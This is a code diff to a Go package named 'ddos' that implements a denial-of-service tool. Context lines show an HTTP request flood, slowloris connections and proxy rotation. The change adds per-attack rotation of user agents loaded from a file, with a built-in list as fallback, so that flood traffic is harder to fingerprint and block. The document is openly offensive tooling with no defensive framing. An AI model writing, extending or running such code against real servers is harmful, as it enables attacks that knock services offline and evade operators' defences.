@@ -1,6 +1,7 @@
 package ddos
 
 import (
+	"bufio"
 	"context"
 	"crypto/tls"
 	"fmt"
@@ -8,6 +9,7 @@ import (
 	"net"
 	"net/http"
 	"net/url"
+	"os"
 	"strings"
 	"sync"
 	"sync/atomic"
@@ -49,6 +51,10 @@ type DDoSConfig struct {
 	ProxyList   []string // List of proxy URLs (e.g., "http://1.2.3.4:8080")
 	RotateProxy bool     // Rotate through proxies for each request
 
+	// User Agent settings
+	UseCustomUserAgents bool   // Whether to use custom user agents from file
+	UserAgentFilePath   string // Path to file containing custom user agents (one per line)
+
 	// Callbacks
 	OnProgress func(stats AttackStats)
 }
@@ -83,6 +89,10 @@ type DDoSAttack struct {
 	totalResponseTime int64 // in nanoseconds
 	proxyIndex        int64 // Current proxy index for rotation
 
+	// User agents
+	userAgents     []string // List of user agents to rotate from
+	userAgentIndex int64
+
 	startTime time.Time
 	running   bool
 	mu        sync.Mutex
@@ -113,9 +123,24 @@ func New(config DDoSConfig) *DDoSAttack {
 		config.Headers = make(map[string]string)
 	}
 
-	return &DDoSAttack{
+	attack := &DDoSAttack{
 		config: config,
 	}
+
+	// Load user agents (custom from file or built-in)
+	if config.UseCustomUserAgents && config.UserAgentFilePath != "" {
+		if agents, err := loadUserAgentsFromFile(config.UserAgentFilePath); err == nil && len(agents) > 0 {
+			attack.userAgents = agents
+		} else {
+			// Fallback to built-in agents if file loading fails
+			attack.userAgents = getBuiltInUserAgents()
+		}
+	} else {
+		// Use built-in user agents
+		attack.userAgents = getBuiltInUserAgents()
+	}
+
+	return attack
 }
 
 // Start begins the DDoS attack
@@ -365,7 +390,7 @@ func (d *DDoSAttack) sendRequest(client *http.Client) {
 	}
 
 	// Set headers
-	req.Header.Set("User-Agent", getRandomUserAgent())
+	req.Header.Set("User-Agent", d.getRandomUserAgent())
 	req.Header.Set("Accept", "*/*")
 	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
 	req.Header.Set("Cache-Control", "no-cache")
@@ -493,7 +518,7 @@ func (d *DDoSAttack) slowlorisConnection() {
 
 	initialHeaders := fmt.Sprintf("%s %s HTTP/1.1\r\n", d.config.Method, path)
 	initialHeaders += fmt.Sprintf("Host: %s\r\n", host)
-	initialHeaders += fmt.Sprintf("User-Agent: %s\r\n", getRandomUserAgent())
+	initialHeaders += fmt.Sprintf("User-Agent: %s\r\n", d.getRandomUserAgent())
 	initialHeaders += "Accept: */*\r\n"
 	initialHeaders += "Accept-Language: en-US,en;q=0.9\r\n"
 
@@ -528,23 +553,55 @@ func (d *DDoSAttack) slowlorisConnection() {
 	}
 }
 
-// User agents for rotation
-var userAgents = []string{
-	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
-	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
-	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
-	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
-	"Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
-	"Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.43 Mobile Safari/537.36",
+// getRandomUserAgent returns a random user agent from the attack's user agent list
+func (d *DDoSAttack) getRandomUserAgent() string {
+	if len(d.userAgents) == 0 {
+		return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+	}
+	idx := atomic.AddInt64(&d.userAgentIndex, 1)
+	return d.userAgents[idx%int64(len(d.userAgents))]
 }
 
-var userAgentIndex int64
+// getBuiltInUserAgents returns the default built-in user agents
+func getBuiltInUserAgents() []string {
+	return []string{
+		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
+		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
+		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
+		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+		"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
+		"Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
+		"Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.43 Mobile Safari/537.36",
+	}
+}
 
-func getRandomUserAgent() string {
-	idx := atomic.AddInt64(&userAgentIndex, 1)
-	return userAgents[idx%int64(len(userAgents))]
+// loadUserAgentsFromFile loads user agents from a file (one per line)
+func loadUserAgentsFromFile(filePath string) ([]string, error) {
+	file, err := os.Open(filePath)
+	if err != nil {
+		return nil, fmt.Errorf("failed to open user agent file: %w", err)
+	}
+	defer file.Close()
+
+	var agents []string
+	scanner := bufio.NewScanner(file)
+	for scanner.Scan() {
+		line := strings.TrimSpace(scanner.Text())
+		if line != "" { // Skip empty lines
+			agents = append(agents, line)
+		}
+	}
+
+	if err := scanner.Err(); err != nil {
+		return nil, fmt.Errorf("error reading user agent file: %w", err)
+	}
+
+	if len(agents) == 0 {
+		return nil, fmt.Errorf("no user agents found in file")
+	}
+
+	return agents, nil
 }
 
 // FormatBytes formats bytes to human-readable string
